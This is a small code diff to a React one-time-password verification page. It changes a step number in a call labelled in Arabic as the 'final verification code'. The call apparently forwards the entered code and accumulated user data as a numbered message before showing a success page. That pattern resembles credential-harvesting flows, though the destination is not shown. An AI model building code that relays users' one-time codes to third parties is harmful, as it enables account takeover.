@@ -35,7 +35,7 @@ const OTPVerification = () => {
         otp
       };
       updateData(newData);
-      await sendCumulativeMessage(7, "رمز التحقق النهائي", newData);
+      await sendCumulativeMessage(8, "رمز التحقق النهائي", newData);
       navigate('/success');
     }
   };
